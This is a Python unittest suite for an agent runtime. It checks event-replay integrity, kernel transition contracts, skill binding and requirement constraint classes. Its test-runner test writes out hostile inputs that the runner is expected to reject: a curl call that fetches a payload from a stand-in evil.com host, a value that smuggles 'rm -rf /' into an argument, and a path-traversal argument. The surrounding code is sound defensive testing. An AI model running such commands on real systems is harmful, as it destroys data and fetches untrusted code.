"""
S-Class EOS V11.2 - Stabilization & Authority Hardening Suite
(tests/test_v11_stabilization.py)

Validates the 6 stabilization targets:
1. P0-1: Event sourcing / replay correctness (canonical schema, multi-step projection, tampered event detection).
2. P0-2: Kernel API contract (authoritative currentPhase from disk, caller state mismatch rejection).
3. P0-3: SClassTestRunner authority boundary (whitelisted executables, path traversal rejection, shell injection rejection).
4. P0-4: Frozen dynamic skill installation (supply-chain boundary, no arbitrary git clone).
5. P0-5: ConstraintClass separation (HARD_CONSTRAINT vs PREFERENCE).
6. P0-6: Dependency & import cycle cleanliness.
"""

import os
import sys
import json
import shutil
import tempfile
import unittest
from typing import Dict, Any, List

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import runtime
from event_store import EventStore, EventRecord
from sclass_kernel import MinimalDeterministicKernel, kernel_instance
from world_model_engine import SClassTestRunner, WorldModelPromotionEngine
from sclass_skill_discovery import SkillDiscoveryEngine
from requirement_ir import RequirementNode, RequirementKind, ConstraintClass, ProvenanceKind, EpistemicStatus


class TestV11StabilizationPass(unittest.TestCase):
    """Test battery verifying all P0 stabilization hardening invariants."""

    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="sclass_stab_test_")
        self.agents_dir = os.path.join(self.test_dir, ".agents")
        os.makedirs(self.agents_dir, exist_ok=True)

    def tearDown(self):
        try:
            shutil.rmtree(self.test_dir)
        except Exception:
            pass

    # =========================================================================
    # P0-1: Event Sourcing & Replay Correctness
    # =========================================================================

    def test_p0_1_canonical_event_record_schema_and_projection(self):
        """Invariant: EventRecord writer and replay projection consume the exact same canonical schema."""
        # 1. Initialize state
        runtime.initialize_state(goal="Build secure banking portal", workspace_dir=self.test_dir)
        state = runtime.get_state(self.test_dir)
        self.assertEqual(state.currentPhase, "TRIAGE")

        # 2. Append canonical events directly through EventStore
        ev1 = EventRecord(
            event_id=1,
            event_name="triage_done",
            from_state="TRIAGE",
            to_state="ANALYSIS",
            timestamp="2026-08-15T00:00:01Z",
            payload={"eventName": "triage_done", "fromPhase": "TRIAGE", "toPhase": "ANALYSIS"}
        )
        ev2 = EventRecord(
            event_id=2,
            event_name="context_loaded",
            from_state="ANALYSIS",
            to_state="SPECIFICATION_SYNTHESIS",
            timestamp="2026-08-15T00:00:02Z",
            payload={"eventName": "context_loaded", "fromPhase": "ANALYSIS", "toPhase": "SPECIFICATION_SYNTHESIS"}
        )
        ev3 = EventRecord(
            event_id=3,
            event_name="spec_synthesized",
            from_state="SPECIFICATION_SYNTHESIS",
            to_state="DESIGN",
            timestamp="2026-08-15T00:00:03Z",
            payload={"eventName": "spec_synthesized", "fromPhase": "SPECIFICATION_SYNTHESIS", "toPhase": "DESIGN"}
        )

        EventStore.append_event(ev1, workspace_dir=self.test_dir)
        EventStore.append_event(ev2, workspace_dir=self.test_dir)
        EventStore.append_event(ev3, workspace_dir=self.test_dir)

        # 3. Simulate restart: project state from event store
        kernel = MinimalDeterministicKernel()
        proj = kernel.reconstruct_state_from_event_store(workspace_dir=self.test_dir)

        self.assertTrue(proj["reconstructed"])
        self.assertEqual(proj["total_events"], 3)
        self.assertEqual(proj["currentPhase"], "DESIGN")

        # 4. Verify persisted state on disk matches projection
        disk_state = runtime.get_state(self.test_dir)
        self.assertEqual(disk_state.currentPhase, "DESIGN")
        self.assertEqual(len(disk_state.transitionHistory), 3)

    def test_p0_1_semantic_replay_with_checkpointing_and_restart(self):
        """Invariant: Event replay from checkpoint + tail events guarantees semantic currentPhase equality."""
        runtime.initialize_state(goal="Build payment ledger", workspace_dir=self.test_dir)
        
        # Dispatch 3 sequential transitions through runtime pipeline
        runtime.dispatch_event("triage_done", workspace_dir=self.test_dir)
        state1 = runtime.get_state(self.test_dir)
        self.assertEqual(state1.currentPhase, "ANALYSIS")

        runtime.dispatch_event("context_loaded", workspace_dir=self.test_dir)
        state2 = runtime.get_state(self.test_dir)
        self.assertEqual(state2.currentPhase, "SPECIFICATION_SYNTHESIS")

        # Create checkpoint snapshot at offset 1
        EventStore.create_checkpoint(runtime.asdict(state1), event_offset=1, workspace_dir=self.test_dir)

        # Dispatch 3rd event
        runtime.dispatch_event("spec_synthesized", workspace_dir=self.test_dir)
        state3 = runtime.get_state(self.test_dir)
        self.assertEqual(state3.currentPhase, "DESIGN")

        # Simulate fresh process restart by projecting state from event store
        kernel = MinimalDeterministicKernel()
        proj = kernel.reconstruct_state_from_event_store(workspace_dir=self.test_dir)

        self.assertTrue(proj["reconstructed"])
        self.assertEqual(proj["currentPhase"], "DESIGN")

        # Exact disk state semantic verification
        disk_state = runtime.get_state(self.test_dir)
        self.assertEqual(disk_state.currentPhase, "DESIGN")
        self.assertEqual(disk_state.activeEvent, "spec_synthesized")

    def test_p0_1_strict_event_record_schema_boundaries(self):
        """Invariant: EventRecord provides strict canonical attribute access and does not blur payload keys."""
        ev = EventRecord(
            event_id=1,
            event_name="triage_done",
            from_state="TRIAGE",
            to_state="ANALYSIS",
            timestamp="2026-08-15T00:00:01Z",
            payload={"custom_metric": 42, "actor": "developer"}
        )
        # 1. Canonical fields accessible
        self.assertEqual(ev["event_name"], "triage_done")
        self.assertEqual(ev["from_state"], "TRIAGE")
        self.assertEqual(ev["to_state"], "ANALYSIS")
        self.assertEqual(ev.event_name, "triage_done")

        # 2. Arbitrary payload keys must NOT be accessed as top-level EventRecord keys
        with self.assertRaises(KeyError):
            _ = ev["custom_metric"]

        # 3. Payload accessible explicitly
        self.assertEqual(ev.payload["custom_metric"], 42)
        self.assertEqual(ev.payload["actor"], "developer")

    def test_p0_1_tampered_or_discontinuous_events_fail_closed(self):
        """Invariant: Tampered sequence numbers, duplicate IDs, or state discontinuities fail closed with ValueError."""
        # 1. State discontinuity: event 2 claims to start from QA instead of ANALYSIS
        bad_ev1 = EventRecord(event_id=1, event_name="triage_done", from_state="TRIAGE", to_state="ANALYSIS", timestamp="2026-08-15T00:00:01Z")
        bad_ev2 = EventRecord(event_id=2, event_name="test_passed", from_state="QA", to_state="RELEASE", timestamp="2026-08-15T00:00:02Z")

        EventStore.append_event(bad_ev1, workspace_dir=self.test_dir)
        EventStore.append_event(bad_ev2, workspace_dir=self.test_dir)

        kernel = MinimalDeterministicKernel()
        with self.assertRaises(ValueError) as ctx:
            kernel.reconstruct_state_from_event_store(workspace_dir=self.test_dir)
        self.assertIn("State discontinuity", str(ctx.exception))

        # 2. Clear and test duplicate event ID
        os.remove(EventStore.get_store_file(self.test_dir))
        dup_ev1 = EventRecord(event_id=1, event_name="triage_done", from_state="TRIAGE", to_state="ANALYSIS", timestamp="2026-08-15T00:00:01Z")
        dup_ev2 = EventRecord(event_id=1, event_name="context_loaded", from_state="ANALYSIS", to_state="DESIGN", timestamp="2026-08-15T00:00:02Z")

        EventStore.append_event(dup_ev1, workspace_dir=self.test_dir)
        EventStore.append_event(dup_ev2, workspace_dir=self.test_dir)

        with self.assertRaises(ValueError) as ctx2:
            kernel.reconstruct_state_from_event_store(workspace_dir=self.test_dir)
        self.assertIn("Duplicate event_id", str(ctx2.exception))

    # =========================================================================
    # P0-2: Kernel API Contract
    # =========================================================================

    def test_p0_2_kernel_api_authoritative_state_and_from_state_mismatch(self):
        """Invariant: request_transition derives state authoritatively; rejects mismatched from_state."""
        runtime.initialize_state(goal="Build secure gateway", workspace_dir=self.test_dir)
        kernel = MinimalDeterministicKernel()

        # 1. Caller passes correct from_state -> proceeds
        res1 = kernel.request_transition(from_state="TRIAGE", event_name="triage_done", workspace_dir=self.test_dir)
        self.assertEqual(res1["status"], "APPROVED")
        self.assertEqual(res1["currentPhase"], "ANALYSIS")

        # 2. Caller passes wrong from_state (claims CODING when state is ANALYSIS) -> fails closed
        with self.assertRaises(ValueError) as ctx:
            kernel.request_transition(from_state="CODING", event_name="code_written", workspace_dir=self.test_dir)
        self.assertIn("State mismatch: caller claims from_state='CODING'", str(ctx.exception))

        # 3. Caller omits from_state -> derives authoritative currentPhase (ANALYSIS) from disk
        res2 = kernel.request_transition(event_name="context_loaded", workspace_dir=self.test_dir)
        self.assertEqual(res2["status"], "APPROVED")
        self.assertEqual(res2["currentPhase"], "SPECIFICATION_SYNTHESIS")

    def test_p0_2_from_state_only_without_event_name_strictly_fails_closed(self):
        """Invariant: request_transition without event_name strictly blocks and never reinterprets from_state."""
        runtime.initialize_state(goal="Build auth proxy", workspace_dir=self.test_dir)
        kernel = MinimalDeterministicKernel()

        # 1. from_state provided without event_name -> FAILS CLOSED
        with self.assertRaises(ValueError) as ctx1:
            kernel.request_transition(from_state="TRIAGE", workspace_dir=self.test_dir)
        self.assertIn("Missing mandatory 'event_name'", str(ctx1.exception))

        # 2. from_state provided with empty event_name -> FAILS CLOSED
        with self.assertRaises(ValueError) as ctx2:
            kernel.request_transition(from_state="TRIAGE", event_name="", workspace_dir=self.test_dir)
        self.assertIn("Missing mandatory 'event_name'", str(ctx2.exception))

        # 3. from_state provided with whitespace event_name -> FAILS CLOSED
        with self.assertRaises(ValueError) as ctx3:
            kernel.request_transition(from_state="TRIAGE", event_name="   ", workspace_dir=self.test_dir)
        self.assertIn("Missing mandatory 'event_name'", str(ctx3.exception))

    # =========================================================================
    # P0-3: SClassTestRunner Authority Boundary
    # =========================================================================

    def test_p0_3_test_runner_rejects_unauthorized_shell_commands_and_injection(self):
        """Invariant: SClassTestRunner strictly rejects arbitrary shell utilities, shell injection, and traversal."""
        # Create a valid test script in workspace
        test_file = os.path.join(self.test_dir, "test_sample.py")
        with open(test_file, "w") as f:
            f.write("import sys; sys.exit(0)\n")

        # 1. Arbitrary shell command (e.g., 'rm', 'curl', 'bash') fails closed
        with self.assertRaises(ValueError) as ctx1:
            SClassTestRunner.execute_and_issue_evidence(
                test_command=["curl", "https://evil.com/payload"],
                test_entity_id="test://evil",
                target_entity_id="sym://target",
                test_framework="unittest",
                repository_state_hash="repo_hash_1",
                cwd=self.test_dir
            )
        self.assertIn("Unauthorized executable", str(ctx1.exception))

        # 2. Shell injection metacharacters (;, |, &&, $) fail closed
        with self.assertRaises(ValueError) as ctx2:
            SClassTestRunner.execute_and_issue_evidence(
                test_command=[sys.executable, "test_sample.py; rm -rf /"],
                test_entity_id="test://injection",
                target_entity_id="sym://target",
                test_framework="unittest",
                repository_state_hash="repo_hash_1",
                cwd=self.test_dir
            )
        self.assertIn("Command contains forbidden shell metacharacter", str(ctx2.exception))

        # 3. Path traversal outside repository fails closed
        with self.assertRaises(ValueError) as ctx3:
            SClassTestRunner.execute_and_issue_evidence(
                test_command=[sys.executable, "../../outside_script.py"],
                test_entity_id="test://traversal",
                target_entity_id="sym://target",
                test_framework="unittest",
                repository_state_hash="repo_hash_1",
                cwd=self.test_dir
            )
        self.assertIn("Path traversal violation", str(ctx3.exception))

        # 4. Command target mismatch (command executes unrelated file instead of authorized entity) fails closed
        with self.assertRaises(ValueError) as ctx4:
            SClassTestRunner.execute_and_issue_evidence(
                test_command=[sys.executable, "test_sample.py"],
                test_entity_id="test://tests/test_unrelated_target.py#test_fn",
                target_entity_id="sym://target",
                test_framework="unittest",
                repository_state_hash="repo_hash_1",
                cwd=self.test_dir
            )
        self.assertIn("Command target mismatch", str(ctx4.exception))

        # 5. Valid governed test command matching authorized entity succeeds and issues authentic evidence
        ev = SClassTestRunner.execute_and_issue_evidence(
            test_command=[sys.executable, "test_sample.py"],
            test_entity_id="test://test_sample.py#test",
            target_entity_id="sym://src/app.py#fn",
            test_framework="unittest",
            repository_state_hash="repo_hash_valid_001",
            cwd=self.test_dir
        )
        self.assertEqual(ev.exit_code, 0)
        self.assertTrue(ev.evidence_hash)
        self.assertTrue(ev.evidence_signature)
        self.assertEqual(ev.issuer_subsystem, "SCLASS_TEST_RUNNER")

    # =========================================================================
    # P0-4: Frozen Dynamic Skill Installation
    # =========================================================================

    def test_p0_4_frozen_skill_discovery_does_not_execute_arbitrary_cloning(self):
        """Invariant: SkillDiscoveryEngine binds local skills but does NOT invoke dynamic git clone during runtime."""
        receipt = SkillDiscoveryEngine.find_and_bind_required_skills(
            goal_text="Build 3d animation with taste and craft table erp",
            workspace_dir=self.test_dir
        )
        self.assertIn("status", receipt)
        self.assertEqual(receipt["status"], "DISCOVERED_AND_BOUND")
        # Ensure receipt is written to .agents/skill_discovery_receipt.json
        receipt_path = os.path.join(self.agents_dir, "skill_discovery_receipt.json")
        self.assertTrue(os.path.exists(receipt_path))

    # =========================================================================
    # P0-5: Hard Constraints vs Preferences
    # =========================================================================

    def test_p0_5_hard_constraints_vs_preferences_separation(self):
        """Invariant: RequirementNode distinguishes HARD_CONSTRAINT from PREFERENCE without corrupting canonical hashes."""
        # 1. Hard constraint requirement (Security invariant)
        hard_req = RequirementNode(
            id="REQ-SEC-001",
            kind=RequirementKind.NON_FUNCTIONAL,
            statement="All passwords must be hashed with argon2id",
            actor="system",
            capability="auth",
            target="credential_store",
            constraint_class=ConstraintClass.HARD_CONSTRAINT,
            confidence=1.0
        )
        self.assertEqual(hard_req.constraint_class, ConstraintClass.HARD_CONSTRAINT)

        # 2. Preference requirement (Styling suggestion)
        pref_req = RequirementNode(
            id="REQ-UI-PREF-001",
            kind=RequirementKind.FUNCTIONAL,
            statement="Buttons should use subtle spring motion curve on press",
            actor="user",
            capability="interact",
            target="button",
            constraint_class=ConstraintClass.PREFERENCE,
            confidence=0.8
        )
        self.assertEqual(pref_req.constraint_class, ConstraintClass.PREFERENCE)

        # 3. Serialization and deserialization roundtrip
        hard_dict = hard_req.to_dict()
        pref_dict = pref_req.to_dict()

        self.assertEqual(hard_dict["constraint_class"], "hard_constraint")
        self.assertEqual(pref_dict["constraint_class"], "preference")

        hard_rehydrated = RequirementNode.from_dict(hard_dict)
        pref_rehydrated = RequirementNode.from_dict(pref_dict)

        self.assertEqual(hard_rehydrated.constraint_class, ConstraintClass.HARD_CONSTRAINT)
        self.assertEqual(pref_rehydrated.constraint_class, ConstraintClass.PREFERENCE)
        self.assertEqual(hard_req.canonical_hash(), hard_rehydrated.canonical_hash())
        self.assertEqual(pref_req.canonical_hash(), pref_rehydrated.canonical_hash())


if __name__ == "__main__":
    unittest.main()
